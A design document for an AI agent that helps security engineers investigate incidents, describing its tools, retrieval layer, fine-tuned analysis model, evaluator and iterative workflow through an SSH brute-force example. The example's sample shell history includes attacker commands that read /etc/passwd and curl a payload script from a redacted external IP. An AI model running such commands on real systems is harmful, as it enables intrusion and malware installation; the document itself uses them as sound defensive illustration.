# AI Security Incident Investigation Agent
## Project Workflow

## 1. Project Overview

The AI Security Incident Investigation Agent is an AI-powered assistant that helps security engineers investigate security incidents.

A user provides an incident description and supporting evidence such as logs. The system uses an investigation agent to determine what information is needed, calls the appropriate investigation tools, retrieves relevant security knowledge through RAG, and uses a fine-tuned LLM to produce structured security analysis.

The system can identify missing evidence and continue investigating before producing the final incident report.

The goal is **assisted investigation**, not fully autonomous security operations or automatic remediation.

---

## 2. The Main Problem

Security incident investigation often requires an engineer to:

1. Understand the initial incident.
2. Examine logs and other evidence.
3. Determine what type of incident may have occurred.
4. Find the relevant investigation procedure.
5. Research security knowledge and vulnerabilities.
6. Determine whether the available evidence is sufficient.
7. Identify missing evidence.
8. Perform additional investigation.
9. Produce a clear, evidence-backed incident report.

This project demonstrates how an agentic AI system can coordinate these steps while keeping the investigation state and providing measurable evaluation.

---

## 3. High-Level Workflow

The complete workflow is:

```text
User
  |
  | Incident description + evidence/logs
  v
FastAPI
  |
  v
Investigation Agent
  |
  | Decides what information is needed
  v
Investigation Tools
  |
  +--> analyze_log()
  |
  +--> search_security_knowledge()
  |
  +--> search_cve()
  |
  +--> get_incident_playbook()
  |
  v
Tool Results
  |
  v
Investigation State
  |
  v
Fine-tuned LLM
  |
  v
Structured Security Analysis
  |
  v
Investigation Agent
  |
  | "Is there enough evidence?"
  |
  +---- YES ----> Final Report
  |
  +---- NO -----> More Tools
                       |
                       v
                  New Evidence
                       |
                       v
                 Fine-tuned LLM
                       |
                       v
                 Updated Analysis
                       |
                       v
              Continue Investigation
```

The important idea is that investigation is **iterative**.

The agent does not have to call every tool. It decides which tools are useful based on the incident and the evidence already collected.

---

# 4. Components and Responsibilities

## 4.1 User

The user provides:

- Incident description
- Logs
- Other available evidence

Example:

> We detected 150 failed SSH login attempts against `deploy-admin`, followed by a successful login from the same external IP.

The user may also provide raw log files or other incident evidence.

---

## 4.2 FastAPI

FastAPI provides the API layer between the user/client and the investigation system.

It is responsible for:

- Receiving incidents
- Receiving evidence
- Starting an investigation
- Returning investigation results
- Returning the final incident report

Conceptually:

```text
Client
  |
  v
FastAPI
  |
  v
Investigation System
```

FastAPI is not responsible for deciding which tools to call. That is the responsibility of the investigation agent.

---

# 5. Investigation Agent

The Investigation Agent is the coordinator of the investigation.

Its responsibilities are to:

1. Understand the incident.
2. Decide what information is needed.
3. Select appropriate tools.
4. Call tools in an appropriate order.
5. Observe tool results.
6. Maintain investigation state.
7. Send relevant evidence to the analysis model.
8. Review the model's structured analysis.
9. Determine whether additional evidence is needed.
10. Request more investigation when necessary.
11. Stop when enough evidence has been collected.
12. Produce or coordinate the final report.

The agent is therefore the component that makes the system agentic.

### Important distinction

The agent is not the same thing as the fine-tuned LLM.

The agent answers:

> "What should I investigate next?"

The fine-tuned LLM answers:

> "Given the evidence I have, what does this evidence indicate?"

---

# 6. Investigation Tools

The agent has access to a defined set of tools.

The initial tools are:

```text
analyze_log()
search_security_knowledge()
search_cve()
get_incident_playbook()
```

The agent knows these tools because their names, descriptions, parameters, and expected outputs are provided to the agent.

The agent does not magically know that a tool exists.

---

## 6.1 analyze_log()

Purpose:

Analyze raw logs and convert them into structured evidence.

Example:

```text
Raw logs
    |
    v
analyze_log()
    |
    v
Structured evidence
```

Possible result:

```json
{
  "failed_attempts": 150,
  "successful_attempts": 1,
  "account": "deploy-admin",
  "source_ip": "185.xxx.xxx.xxx",
  "software": "OpenSSH 8.2"
}
```

The purpose is to avoid repeatedly sending large amounts of raw log data to the model.

---

## 6.2 search_security_knowledge()

Purpose:

Search the security knowledge base for relevant information.

The knowledge base can contain:

- Security concepts
- Incident response guidance
- MITRE ATT&CK information
- Investigation procedures
- Public security guidance
- Other relevant security documentation

The tool performs semantic retrieval using the RAG pipeline.

Conceptually:

```text
Security question
      |
      v
Embedding model
      |
      v
Vector search
      |
      v
Relevant security documents/chunks
```

---

## 6.3 search_cve()

Purpose:

Search for potentially relevant Common Vulnerabilities and Exposures (CVEs).

Example:

```text
search_cve(
    product="OpenSSH",
    version="8.2"
)
```

The result can provide information about vulnerabilities associated with the relevant software/version.

Important:

A returned CVE does **not** automatically prove that the vulnerability caused the incident.

The system must distinguish between:

```text
Potentially relevant vulnerability
```

and:

```text
Evidence demonstrates exploitation
```

---

## 6.4 get_incident_playbook()

Purpose:

Retrieve the investigation procedure relevant to the suspected incident type.

Example:

```text
get_incident_playbook(
    incident_type="credential_compromise"
)
```

Possible playbooks:

```text
brute_force
credential_compromise
malware
phishing
privilege_escalation
suspicious_network_activity
data_exfiltration
```

The agent first needs enough information to determine what type of investigation is appropriate.

The agent does not inherently know the contents of a playbook. The playbook is retrieved through the tool/knowledge system.

---

# 7. RAG Knowledge Layer

RAG (Retrieval-Augmented Generation) provides the system with external security knowledge.

The basic process is:

```text
Security documents
      |
      v
Clean documents
      |
      v
Chunk documents
      |
      v
Generate embeddings
      |
      v
Store vectors in Qdrant
      |
      v
      SEARCH
      |
      v
Retrieve relevant chunks
      |
      v
Provide context to LLM
```

RAG is primarily responsible for **providing knowledge**.

It is not responsible for deciding the investigation workflow.

### RAG vs Fine-Tuning

These solve different problems.

**RAG:**

> "What relevant security knowledge should the model have access to?"

**Fine-tuning:**

> "How should the model perform this specific security-analysis task?"

RAG allows the knowledge base to be updated without retraining the model.

---

# 8. Fine-Tuned LLM

The fine-tuned LLM is the specialist security-analysis component.

It receives the relevant incident information and collected evidence.

It can produce structured output such as:

```json
{
  "incident_type": "credential_compromise",
  "severity": "high",
  "confidence": 0.82,
  "indicators": [
    "185.xxx.xxx.xxx",
    "deploy-admin"
  ],
  "findings": [
    "150 failed SSH attempts were followed by a successful login"
  ],
  "missing_evidence": [
    "commands executed after login",
    "files accessed"
  ]
}
```

The fine-tuned model is intended to become better at the specific security-analysis behavior required by the project.

Potential tasks include:

- Incident classification
- Severity classification
- IOC extraction
- Evidence interpretation
- Structured findings
- Identifying potentially missing evidence
- Consistent security-analysis formatting

The model should not be treated as the sole source of security knowledge.

---

# 9. What Gets Sent to the Fine-Tuned Model?

The fine-tuned model does not necessarily receive every piece of information produced by every tool.

The Investigation Agent determines what information is relevant.

The analysis input can contain:

```text
Original incident
+
Relevant structured log findings
+
Relevant security knowledge
+
Relevant incident playbook
+
Relevant CVE information
+
Other collected evidence
```

For large inputs, raw information should be normalized or summarized before being passed to the model.

The objective is to give the model a useful **evidence bundle**, rather than blindly dumping every tool response into the context.

---

# 10. Investigation State

Investigation State is the system's working memory for the current investigation.

It keeps track of what has happened during the investigation.

Conceptually:

```text
InvestigationState
|
+-- incident
|
+-- evidence
|
+-- tool_results
|
+-- investigation_steps
|
+-- model_analyses
|
+-- missing_evidence
|
+-- iteration
|
+-- final_report
```

This is important because the investigation may require multiple rounds.

For example:

```text
Iteration 1
    |
    +-- Tools called
    +-- Evidence collected
    +-- Fine-tuned LLM analysis
    +-- Missing evidence identified
```

Then:

```text
Iteration 2
    |
    +-- More tools called
    +-- New evidence collected
    +-- Fine-tuned LLM analysis
```

The system keeps both the investigation history and the current state.

---

# 11. First Model Analysis

The **first model analysis** is the first structured result produced by the fine-tuned LLM after the initial evidence has been collected.

Example:

```text
Incident
   |
   v
Agent
   |
   v
Initial tools
   |
   v
Tool results
   |
   v
Fine-tuned LLM
   |
   v
First Model Analysis
```

Example output:

```json
{
  "incident_type": "credential_compromise",
  "severity": "high",
  "missing_evidence": [
    "commands executed after login",
    "files accessed"
  ]
}
```

This result is stored in Investigation State.

It is not necessarily the final answer.

---

# 12. Agent Uses the Model Analysis

After the fine-tuned LLM produces its analysis, the Investigation Agent receives that result.

The agent can use the model's `missing_evidence` information to determine what should happen next.

Example:

```text
Fine-tuned LLM:

Missing evidence:
- commands executed
- files accessed
```

The agent reasons:

> More evidence is needed to determine the scope of the compromise.

It can then select additional tools.

For example:

```text
analyze_log(shell_history)
analyze_log(file_access_logs)
```

The new tool results are added to Investigation State.

---

# 13. Iterative Investigation

The core agentic loop is:

```text
             ┌─────────────────────┐
             │ Investigation Agent │
             └──────────┬──────────┘
                        |
                        v
                  Select tools
                        |
                        v
                   Tool calls
                        |
                        v
                  Tool results
                        |
                        v
                Investigation State
                        |
                        v
                 Fine-tuned LLM
                        |
                        v
                Model Analysis
                        |
                        v
             Investigation Agent
                        |
                 Is evidence
                   sufficient?
                    /      \
                  NO        YES
                  |          |
                  v          v
             More tools   Final report
                  |
                  v
             New evidence
                  |
                  └───────────────> Fine-tuned LLM
```

This loop should have a maximum number of iterations, such as 2–3, to prevent uncontrolled loops.

---

# 14. Example Investigation

## Initial Incident

The user submits:

> We detected 150 failed SSH login attempts against `deploy-admin`, followed by a successful login from the same external IP.

Logs are also provided.

---

## Step 1 — Agent analyzes the incident

The agent determines that log analysis is needed.

It calls:

```text
analyze_log()
```

Result:

```json
{
  "failed_attempts": 150,
  "successful_attempts": 1,
  "account": "deploy-admin",
  "source_ip": "185.xxx.xxx.xxx",
  "software": "OpenSSH 8.2"
}
```

---

## Step 2 — Agent retrieves relevant knowledge

The agent may call:

```text
get_incident_playbook("credential_compromise")
```

and:

```text
search_security_knowledge(
    "investigating successful SSH login after brute force"
)
```

Because the evidence contains OpenSSH 8.2, it may also decide to call:

```text
search_cve("OpenSSH", "8.2")
```

The agent does not have to call every tool. It chooses tools based on the investigation.

---

## Step 3 — Evidence is assembled

Investigation State now contains:

```text
Original incident
+
Log analysis
+
Credential compromise playbook
+
Relevant security knowledge
+
Relevant CVE results
```

---

## Step 4 — Fine-tuned LLM performs first analysis

The relevant evidence is provided to the fine-tuned LLM.

It produces:

```json
{
  "incident_type": "credential_compromise",
  "severity": "high",
  "confidence": 0.82,
  "findings": [
    "Repeated failed SSH authentication was followed by a successful login."
  ],
  "missing_evidence": [
    "commands executed after login",
    "files accessed after login"
  ]
}
```

This becomes the **first model analysis** in Investigation State.

---

## Step 5 — Agent identifies missing evidence

The Investigation Agent sees:

```text
Missing evidence:
- commands executed
- files accessed
```

It decides that the investigation is incomplete.

It calls additional tools.

---

## Step 6 — Additional evidence is collected

For example:

```text
analyze_log(shell_history)
analyze_log(file_access_logs)
```

The result could be:

```json
{
  "commands_executed": [
    "whoami",
    "cat /etc/passwd",
    "curl http://185.xxx.xxx.xxx/payload.sh"
  ]
}
```

This new evidence is added to Investigation State.

---

## Step 7 — Fine-tuned LLM analyzes again

The fine-tuned LLM receives the updated relevant evidence.

It produces a second analysis:

```json
{
  "incident_type": "credential_compromise",
  "severity": "critical",
  "confidence": 0.96,
  "findings": [
    "Successful login followed brute-force activity.",
    "Commands were executed after authentication.",
    "A remote payload was downloaded."
  ],
  "missing_evidence": []
}
```

This becomes the second model analysis.

---

# 15. Final Report

Once the agent determines that enough evidence has been collected, the system produces the final incident report.

The report should be evidence-backed and structured.

Possible sections:

```text
Incident Summary
Incident Type
Severity
Confidence
Timeline
Indicators of Compromise
Evidence
Findings
Potentially Relevant Vulnerabilities
Investigation Steps
Remaining Uncertainties
Recommended Human Follow-up
Sources
```

The system should clearly distinguish:

```text
Observed evidence
```

from:

```text
Inference
```

and:

```text
Potentially relevant information
```

This is particularly important for CVE results and other contextual information.

---

# 16. Evaluator

The Evaluator is a separate quality-control layer.

It checks whether the investigation/report meets predefined requirements.

Possible checks:

```text
Classification correct?
Severity supported?
Important evidence included?
Findings grounded in evidence?
Citations correct?
Required investigation steps completed?
Important evidence still missing?
```

The evaluator can produce:

```json
{
  "status": "FAIL",
  "missing_evidence": [
    "file access logs"
  ],
  "issues": [
    "The report does not establish whether sensitive files were accessed."
  ]
}
```

Or:

```json
{
  "status": "PASS",
  "issues": []
}
```

---

# 17. Agent vs Evaluator

These components have different responsibilities.

### Investigation Agent

Asks:

> "What should I do next?"

It controls the investigation workflow.

### Fine-tuned LLM

Asks:

> "What does the evidence indicate?"

It performs the specialized analysis.

### Evaluator

Asks:

> "Is the resulting investigation good enough according to our criteria?"

It provides an independent quality check.

---

# 18. Full Feedback Loop

The complete system can therefore become:

```text
                  INCIDENT
                     |
                     v
             INVESTIGATION AGENT
                     |
                     v
               SELECT TOOLS
                     |
                     v
                TOOL RESULTS
                     |
                     v
             INVESTIGATION STATE
                     |
                     v
             FINE-TUNED LLM
                     |
                     v
            STRUCTURED ANALYSIS
                     |
                     v
             INVESTIGATION AGENT
                     |
              Enough evidence?
                /          \
              NO            YES
              |              |
              v              v
         More tools       REPORT
              |              |
              |              v
              |          EVALUATOR
              |              |
              |        Pass / Fail
              |           /     \
              |         PASS     FAIL
              |          |         |
              |          v         v
              |        DONE    Missing evidence
              |                      |
              └──────────────────────┘
                         |
                         v
                  MORE INVESTIGATION
```

---

# 19. What Makes This Agentic?

A simple LLM application might look like:

```text
Incident
   ↓
LLM
   ↓
Report
```

This project goes further:

```text
Incident
   ↓
Agent
   ↓
Plan investigation
   ↓
Select tools
   ↓
Collect evidence
   ↓
Analyze evidence
   ↓
Identify missing evidence
   ↓
Investigate again
   ↓
Analyze again
   ↓
Evaluate
   ↓
Final report
```

The important agentic behavior is the ability to **choose actions based on the current state of the investigation and continue investigating when additional evidence is required.**

---

# 20. What Fine-Tuning Adds

Without fine-tuning, the base LLM can provide a useful baseline.

The project will eventually compare:

```text
Base LLM
     |
     v
Base LLM + RAG
     |
     v
Fine-tuned LLM
     |
     v
Fine-tuned LLM + RAG
```

The goal is to measure whether fine-tuning improves the specific security-analysis tasks.

Potential metrics include:

- Incident classification accuracy/F1
- Severity accuracy
- IOC extraction accuracy
- Structured output validity
- Groundedness
- Hallucination rate

Fine-tuning should therefore be demonstrated through measurable results rather than simply stating that a model was trained.

---

# 21. Technology Responsibilities

| Technology | Responsibility |
|---|---|
| Python | Core application and AI pipeline |
| FastAPI | API layer |
| Agent framework | Agent workflow and tool orchestration |
| Hugging Face Transformers | Model loading/training |
| PEFT | Parameter-efficient fine-tuning |
| LoRA/QLoRA | Fine-tuning approach |
| Qdrant | Vector database |
| Embedding model | Convert text into vectors |
| RAG | Retrieve relevant security knowledge |
| LLM | Security analysis/reasoning |
| Evaluator | Measure investigation/report quality |

---

# 22. What This Project Will NOT Build

To keep the project focused, Version 1 will not attempt to build:

- A complete enterprise SIEM
- Automatic incident remediation
- Automatic server isolation
- A fully autonomous SOC
- A multi-agent swarm
- Dozens of tools
- Kubernetes infrastructure
- Real-time production security monitoring
- A custom transformer model
- Reinforcement learning
- Autonomous tool creation

The focus is:

```text
Agentic investigation
+
RAG
+
Fine-tuning
+
Structured analysis
+
Evaluation
+
Iterative investigation
```

---

# 23. Final Mental Model

The simplest way to remember the architecture is:

### Agent = Investigator

> "What should I investigate next?"

### Tools = Hands

> "These let me obtain information."

### RAG = Knowledge Library

> "Here is relevant security knowledge."

### Fine-tuned LLM = Specialist Analyst

> "Given this evidence, here's my structured analysis."

### Investigation State = Notebook

> "Here's everything we've discovered so far."

### Evaluator = Reviewer

> "Is this investigation good enough?"

Together:

```text
          INVESTIGATOR
               |
          uses TOOLS
               |
          collects EVIDENCE
               |
        stores in STATE
               |
        SPECIALIST ANALYST
               |
         produces ANALYSIS
               |
          INVESTIGATOR
               |
        needs more evidence?
          /            \
        YES             NO
         |               |
    more tools       FINAL REPORT
                         |
                     EVALUATOR
                         |
                  PASS / INVESTIGATE
```

This is the core workflow that the rest of the project will be built around.
